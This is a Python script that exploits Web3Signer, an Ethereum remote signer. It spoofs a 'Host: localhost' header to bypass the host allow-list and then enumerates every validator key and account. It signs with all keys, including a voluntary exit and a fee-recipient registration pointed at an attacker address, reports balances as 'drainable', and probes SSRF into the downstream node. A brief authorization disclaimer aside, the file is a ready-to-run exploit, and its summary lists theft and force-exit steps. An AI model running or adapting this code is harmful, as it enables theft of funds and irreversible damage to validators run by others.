#!/usr/bin/env python3
"""
Web3Signer Full Enumeration — Auth Bypass + Complete Data Extraction
====================================================================
Bypasses HostAllowListHandler via Host header spoof (http.client direct TCP,
no proxy), auto-detects Eth2 vs Eth1 mode, and extracts ALL accessible data.

Saves everything to a text file.

Usage:
  python3 enumerate_signer.py --target <HOST>:<PORT>
  python3 enumerate_signer.py --target <HOST>:<PORT> --output results.txt
  python3 enumerate_signer.py --target <HOST>:<PORT> -v

IMPORTANT: Security audit tool. Only use against systems you are authorized to test.
"""

from __future__ import annotations

import argparse
import http.client
import json
import socket
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Raw HTTP via http.client — direct TCP, no proxy, Host: localhost guaranteed
# ---------------------------------------------------------------------------

VERBOSE = False


def _parse_target(target):
    # type: (str) -> Tuple[str, int]
    if ":" in target:
        parts = target.rsplit(":", 1)
        return parts[0], int(parts[1])
    return target, 9000


def raw_request(target, method, path, body=None, headers=None, timeout=8):
    # type: (str, str, str, Optional[str], Optional[Dict[str,str]], int) -> Tuple[int, str]
    """Direct TCP request with Host: localhost. No proxy, no urllib."""
    host, port = _parse_target(target)
    if headers is None:
        headers = {}
    headers.setdefault("Host", "localhost")
    headers.setdefault("Accept", "application/json")
    if body is not None:
        headers.setdefault("Content-Type", "application/json")

    if VERBOSE:
        print("    >>> %s http://%s:%d%s" % (method, host, port, path))
        for k, v in headers.items():
            print("    >>> %s: %s" % (k, v))
        if body:
            print("    >>> %s" % body[:300])

    conn = None
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        if VERBOSE:
            print("    <<< %d %s" % (resp.status, resp.reason))
            print("    <<< %s" % resp_body[:300])
        return resp.status, resp_body
    except socket.timeout:
        return 0, "TIMEOUT %ds to %s:%d" % (timeout, host, port)
    except ConnectionRefusedError:
        return 0, "REFUSED %s:%d not listening" % (host, port)
    except socket.gaierror:
        return 0, "DNS FAIL cannot resolve %s" % host
    except OSError as e:
        return 0, "NET ERROR %s:%d %s" % (host, port, e)
    except Exception as e:
        return 0, "%s: %s" % (type(e).__name__, e)
    finally:
        if conn:
            conn.close()


def http_get(target, path, timeout=8):
    return raw_request(target, "GET", path, timeout=timeout)


def http_post(target, path, body, timeout=10):
    data = json.dumps(body) if isinstance(body, dict) else str(body)
    return raw_request(target, "POST", path, body=data, timeout=timeout)


def http_delete(target, path, body, timeout=10):
    data = json.dumps(body)
    return raw_request(target, "DELETE", path, body=data, timeout=timeout)


def jsonrpc(target, method, params=None, rpc_id=1):
    body = {"jsonrpc": "2.0", "method": method, "params": params or [], "id": rpc_id}
    status, text = http_post(target, "/", body)
    try:
        return status, json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return status, {"raw": text}


def jp(obj):
    """Pretty-print JSON."""
    return json.dumps(obj, indent=2)


# ---------------------------------------------------------------------------
# Report — collects and renders findings
# ---------------------------------------------------------------------------

class Report:
    def __init__(self, target):
        self.target = target
        self.ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        self.lines = []  # type: List[str]

    def h1(self, title):
        self.lines.append("")
        self.lines.append("=" * 78)
        self.lines.append("  %s" % title)
        self.lines.append("=" * 78)

    def h2(self, title):
        self.lines.append("")
        self.lines.append("--- %s ---" % title)

    def p(self, text):
        self.lines.append("  %s" % text)

    def blank(self):
        self.lines.append("")

    def block(self, text):
        for line in text.split("\n"):
            self.lines.append("    %s" % line)

    def render(self):
        header = [
            "=" * 78,
            "WEB3SIGNER — FULL DATA EXTRACTION REPORT",
            "=" * 78,
            "Target:     %s" % self.target,
            "Timestamp:  %s" % self.ts,
            "Bypass:     Host: localhost (http.client direct TCP)",
            "Auth:       NONE on any endpoint",
            "=" * 78,
        ]
        footer = ["", "=" * 78, "END OF REPORT", "=" * 78]
        return "\n".join(header + self.lines + footer)


# ---------------------------------------------------------------------------
# Main extraction logic
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Web3Signer Full Enumeration — bypass + extract all data to txt",
    )
    parser.add_argument("--target", required=True, help="host:port (e.g. 10.0.0.5:9000)")
    parser.add_argument("--metrics-port", type=int, default=9001, help="Metrics port (default 9001)")
    parser.add_argument("--output", default="web3signer_enumeration.txt", help="Output file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show raw HTTP traffic")
    args = parser.parse_args()

    global VERBOSE
    VERBOSE = args.verbose
    target = args.target
    host = _parse_target(target)[0]
    report = Report(target)

    print("=" * 60)
    print("Web3Signer Enumeration (http.client direct)")
    print("=" * 60)
    print("Target: %s" % target)

    # ------------------------------------------------------------------
    # TCP + Upcheck
    # ------------------------------------------------------------------
    print("\n[1] TCP connect ...", end=" ", flush=True)
    h, p_num = _parse_target(target)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((h, p_num))
        s.close()
        print("OPEN")
    except Exception as e:
        print("FAILED — %s" % e)
        print("\n[FATAL] Cannot reach %s. Check host/port/firewall." % target)
        sys.exit(1)

    print("[2] Host bypass (/upcheck) ...", end=" ", flush=True)
    st, body = raw_request(target, "GET", "/upcheck", headers={"Accept": "text/plain"})
    if st != 200:
        print("FAILED (HTTP %d)" % st)
        print("[FATAL] Host: localhost not accepted. Try different host values.")
        sys.exit(1)
    print("OK — %s" % body.strip())

    report.h1("HOST BYPASS CONFIRMED")
    report.p("GET /upcheck with Host: localhost → HTTP 200 OK")
    report.p("HostAllowListHandler accepted spoofed Host header from remote IP")

    # ------------------------------------------------------------------
    # Healthcheck
    # ------------------------------------------------------------------
    print("[3] Healthcheck ...", end=" ", flush=True)
    st, body = http_get(target, "/healthcheck")
    if st == 200:
        try:
            hc = json.loads(body)
            print("OK — %s" % hc.get("status", "?"))
            report.h1("HEALTHCHECK")
            report.block(jp(hc))
        except (ValueError, json.JSONDecodeError):
            print("OK")
            report.h1("HEALTHCHECK")
            report.block(body)
    else:
        print("HTTP %d" % st)

    # ------------------------------------------------------------------
    # Auto-detect mode: try Eth2 first, then Eth1
    # ------------------------------------------------------------------
    mode = None
    eth2_keys = []  # type: List[str]
    eth1_accounts = []  # type: List[str]

    print("[4] Detecting mode + enumerating keys ...", end=" ", flush=True)
    st, body = http_get(target, "/api/v1/eth2/publicKeys")
    if st == 200:
        try:
            keys = json.loads(body)
            if isinstance(keys, list) and len(keys) > 0:
                mode = "eth2"
                eth2_keys = keys
        except (ValueError, json.JSONDecodeError):
            pass

    if not mode:
        st, body = http_get(target, "/api/v1/eth1/publicKeys")
        if st == 200:
            try:
                keys = json.loads(body)
                if isinstance(keys, list) and len(keys) > 0:
                    mode = "eth1"
                    st2, resp2 = jsonrpc(target, "eth_accounts")
                    accts = resp2.get("result", [])
                    if isinstance(accts, list):
                        eth1_accounts = accts
            except (ValueError, json.JSONDecodeError):
                pass

    if mode == "eth2":
        print("ETH2 — %d validator keys" % len(eth2_keys))
    elif mode == "eth1":
        print("ETH1 — %d accounts" % len(eth1_accounts))
    else:
        print("UNKNOWN (no keys loaded?)")

    # ------------------------------------------------------------------
    # ETH2 PATH
    # ------------------------------------------------------------------
    if mode == "eth2":
        report.h1("MODE: ETH2 — %d VALIDATOR KEYS" % len(eth2_keys))

        # List all public keys
        report.h2("All BLS Public Keys")
        for i, k in enumerate(eth2_keys):
            report.p("[%d] %s" % (i, k))

        # High watermark
        st, body = http_get(target, "/api/v1/eth2/highWatermark")
        if st == 200:
            report.h2("Slashing Protection High Watermark")
            try:
                report.block(jp(json.loads(body)))
            except (ValueError, json.JSONDecodeError):
                report.block(body)

        # Key Manager API
        print("[5] Key Manager API ...", end=" ", flush=True)
        st, body = http_get(target, "/eth/v1/keystores")
        if st == 200:
            try:
                ks_data = json.loads(body)
                keystores = ks_data.get("data", [])
                print("OK (%d keystores)" % len(keystores))
                report.h2("Key Manager Keystores (no auth despite OpenAPI bearerAuth)")
                report.block(jp(ks_data))
            except (ValueError, json.JSONDecodeError):
                print("OK")
                report.h2("Key Manager Keystores")
                report.block(body)
        else:
            print("N/A (%d)" % st)

        # Sign with EVERY key — this is the proof of total compromise
        print("[6] Signing with ALL %d keys ..." % len(eth2_keys))
        report.h1("SIGNING PROOF — ALL KEYS (ZERO AUTH)")
        report.p("Each signature below proves unrestricted private key access.")
        report.p("Signing = functionally owning the key.")
        report.blank()

        signed_count = 0
        for i, pubkey in enumerate(eth2_keys):
            sign_body = {
                "type": "RANDAO_REVEAL",
                "fork_info": {
                    "fork": {
                        "previous_version": "0x04000000",
                        "current_version": "0x04000000",
                        "epoch": "0",
                    },
                    "genesis_validators_root":
                        "0x0000000000000000000000000000000000000000000000000000000000000000",
                },
                "randao_reveal": {"epoch": "0"},
            }
            st, resp = http_post(target, "/api/v1/eth2/sign/%s" % pubkey, sign_body)
            if st == 200:
                try:
                    sig = json.loads(resp).get("signature", resp)
                except (ValueError, json.JSONDecodeError, AttributeError):
                    sig = resp.strip()
                report.h2("Key [%d] SIGNED" % i)
                report.p("Pubkey:    %s" % pubkey)
                report.p("Signature: %s" % sig)
                report.p("Type:      RANDAO_REVEAL (harmless proof)")
                report.p("Auth:      NONE")
                signed_count += 1
                print("  [%d] %s...%s → SIGNED" % (i, pubkey[:20], pubkey[-8:]))
            else:
                report.h2("Key [%d] FAILED" % i)
                report.p("Pubkey: %s" % pubkey)
                report.p("Error:  HTTP %d — %s" % (st, resp[:200]))
                print("  [%d] %s...%s → FAILED (%d)" % (i, pubkey[:20], pubkey[-8:], st))

        report.blank()
        report.p("TOTAL: %d/%d keys signed without any authentication" % (signed_count, len(eth2_keys)))

        # Also try VOLUNTARY_EXIT and VALIDATOR_REGISTRATION to show full scope
        print("[7] Testing VOLUNTARY_EXIT signing ...", end=" ", flush=True)
        test_key = eth2_keys[0]
        exit_body = {
            "type": "VOLUNTARY_EXIT",
            "fork_info": {
                "fork": {
                    "previous_version": "0x04000000",
                    "current_version": "0x04000000",
                    "epoch": "300000",
                },
                "genesis_validators_root":
                    "0x4b363db94e286120d76eb905340fcd44b1338229ab27b4d6ba2578e7bbe7b7dc",
            },
            "voluntary_exit": {"epoch": "300000", "validator_index": "0"},
        }
        st, resp = http_post(target, "/api/v1/eth2/sign/%s" % test_key, exit_body)
        if st == 200:
            try:
                sig = json.loads(resp).get("signature", resp)
            except (ValueError, json.JSONDecodeError, AttributeError):
                sig = resp.strip()
            print("SIGNED (irreversible exit possible)")
            report.h2("VOLUNTARY_EXIT — Signed (proves irreversible exit possible)")
            report.p("Pubkey:    %s" % test_key)
            report.p("Signature: %s" % sig)
            report.p("Impact:    Broadcasting this exits the validator PERMANENTLY")
        else:
            print("HTTP %d" % st)
            report.h2("VOLUNTARY_EXIT attempt")
            report.p("HTTP %d — %s" % (st, resp[:200]))

        print("[8] Testing VALIDATOR_REGISTRATION signing ...", end=" ", flush=True)
        reg_body = {
            "type": "VALIDATOR_REGISTRATION",
            "validator_registration": {
                "fee_recipient": "0x" + "aa" * 20,
                "gas_limit": "30000000",
                "timestamp": str(int(time.time())),
                "pubkey": test_key,
            },
        }
        st, resp = http_post(target, "/api/v1/eth2/sign/%s" % test_key, reg_body)
        if st == 200:
            try:
                sig = json.loads(resp).get("signature", resp)
            except (ValueError, json.JSONDecodeError, AttributeError):
                sig = resp.strip()
            print("SIGNED (fee redirect possible)")
            report.h2("VALIDATOR_REGISTRATION — Signed (fee hijack possible)")
            report.p("Pubkey:        %s" % test_key)
            report.p("Fee recipient: %s (attacker-controlled)" % ("0x" + "aa" * 20))
            report.p("Signature:     %s" % sig)
            report.p("Impact:        MEV/priority fees redirected to attacker")
        else:
            print("HTTP %d" % st)
            report.h2("VALIDATOR_REGISTRATION attempt")
            report.p("HTTP %d — %s" % (st, resp[:200]))

    # ------------------------------------------------------------------
    # ETH1 PATH
    # ------------------------------------------------------------------
    if mode == "eth1":
        report.h1("MODE: ETH1 — %d ACCOUNTS" % len(eth1_accounts))
        report.h2("All Eth1 Addresses")
        for i, addr in enumerate(eth1_accounts):
            report.p("[%d] %s" % (i, addr))

        # Get balances
        print("[5] Querying balances ...", end=" ", flush=True)
        total_wei = 0
        report.h2("Account Balances")
        for addr in eth1_accounts:
            st, resp = jsonrpc(target, "eth_getBalance", [addr, "latest"])
            result = resp.get("result")
            if result:
                try:
                    wei = int(result, 16)
                    eth_val = wei / 1e18
                    total_wei += wei
                    report.p("%s: %.6f ETH" % (addr, eth_val))
                except (ValueError, TypeError):
                    report.p("%s: %s" % (addr, result))
            else:
                report.p("%s: query failed" % addr)
        total_eth = total_wei / 1e18
        report.blank()
        report.p("TOTAL: %.6f ETH drainable via eth_sendTransaction" % total_eth)
        print("%.6f ETH total" % total_eth)

        # Sign proof
        print("[6] Signing with ALL accounts ...")
        report.h1("SIGNING PROOF — ALL ACCOUNTS (ZERO AUTH)")
        signed_count = 0
        for i, addr in enumerate(eth1_accounts):
            test_msg = "0x" + "41" * 32
            st, resp = jsonrpc(target, "eth_sign", [addr, test_msg])
            result = resp.get("result")
            if result:
                report.h2("Account [%d] SIGNED" % i)
                report.p("Address:   %s" % addr)
                report.p("Message:   %s" % test_msg)
                report.p("Signature: %s" % result)
                report.p("Auth:      NONE")
                signed_count += 1
                print("  [%d] %s → SIGNED" % (i, addr))
            else:
                report.h2("Account [%d] FAILED" % i)
                report.p("Address: %s" % addr)
                report.p("Error:   %s" % json.dumps(resp)[:200])
                print("  [%d] %s → FAILED" % (i, addr))
        report.blank()
        report.p("TOTAL: %d/%d accounts signed" % (signed_count, len(eth1_accounts)))

        # SSRF probe
        print("[7] SSRF via PassThroughHandler ...", end=" ", flush=True)
        ssrf_methods = [
            ("net_version", "Network ID"),
            ("eth_chainId", "Chain ID"),
            ("eth_blockNumber", "Block number"),
            ("web3_clientVersion", "Client version"),
            ("net_peerCount", "Peer count"),
            ("admin_nodeInfo", "Node info"),
            ("admin_peers", "Peer details"),
            ("txpool_status", "TX pool"),
        ]
        accessible = 0
        report.h2("SSRF — Downstream Besu Node Data")
        for method, desc in ssrf_methods:
            st, resp = jsonrpc(target, method)
            result = resp.get("result")
            if st == 200 and result is not None:
                accessible += 1
                result_str = jp(result) if isinstance(result, (dict, list)) else str(result)
                if len(result_str) > 300:
                    result_str = result_str[:300] + " ..."
                report.p("%s (%s): %s" % (method, desc, result_str))
        print("%d methods accessible" % accessible)

    # ------------------------------------------------------------------
    # Metrics (only if port is open)
    # ------------------------------------------------------------------
    print("[9] Metrics port %d ..." % args.metrics_port, end=" ", flush=True)
    metrics_target = "%s:%d" % (host, args.metrics_port)
    try:
        ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ms.settimeout(2)
        ms.connect((host, args.metrics_port))
        ms.close()
        st, body = raw_request(metrics_target, "GET", "/metrics",
                               headers={"Accept": "text/plain"})
        if st == 200:
            print("OK")
            # Extract key metrics
            report.h1("PROMETHEUS METRICS (port %d)" % args.metrics_port)
            for line in body.split("\n"):
                if line.startswith("#"):
                    continue
                for kw in ["signing_signers_loaded", "web3signer_release",
                           "process_start_time", "jvm_memory_bytes_used"]:
                    if kw in line:
                        report.p(line.strip())
            report.h2("Full Metrics Dump")
            report.block(body)
        else:
            print("HTTP %d" % st)
    except (socket.timeout, ConnectionRefusedError, OSError):
        print("port closed (skipping)")

    # ------------------------------------------------------------------
    # Summary
    # ------------------------------------------------------------------
    report.h1("SUMMARY — TOTAL EXPOSURE")
    if mode == "eth2":
        report.p("Mode:       ETH2")
        report.p("Validators: %d" % len(eth2_keys))
        report.p("Staked ETH: %d ETH" % (len(eth2_keys) * 32))
        report.p("Keys signed: %d/%d" % (signed_count, len(eth2_keys)))
        report.blank()
        report.p("WHAT AN ATTACKER CAN DO:")
        report.p("  1. VOLUNTARY_EXIT  — force-exit all validators (irreversible)")
        report.p("  2. VALIDATOR_REGISTRATION — redirect all MEV fees")
        report.p("  3. Sign AGGREGATION_SLOT, SYNC_COMMITTEE — no slashing check")
        report.p("  4. DELETE keystores via Key Manager API (if enabled)")
        report.p("  5. With DB creds: corrupt slashing DB → double-sign → ETH burned")
    elif mode == "eth1":
        report.p("Mode:     ETH1")
        report.p("Accounts: %d" % len(eth1_accounts))
        report.p("Total ETH: %.6f" % total_eth)
        report.p("Keys signed: %d/%d" % (signed_count, len(eth1_accounts)))
        report.blank()
        report.p("WHAT AN ATTACKER CAN DO:")
        report.p("  1. eth_sendTransaction — sign + broadcast = direct theft")
        report.p("  2. eth_signTransaction — sign for later broadcast")
        report.p("  3. SSRF via PassThroughHandler — full Besu node access")

    report.blank()
    report.p("BYPASS: Host: localhost header (HostAllowListHandler.java)")
    report.p("AUTH:   Zero — no JWT, no API key, no bearer token, nothing")

    # ------------------------------------------------------------------
    # Write output
    # ------------------------------------------------------------------
    report_text = report.render()

    with open(args.output, "w") as f:
        f.write(report_text)

    print()
    print("=" * 60)
    print("SAVED: %s (%d bytes)" % (args.output, len(report_text)))
    print("=" * 60)
    print()
    print(report_text)


if __name__ == "__main__":
    main()
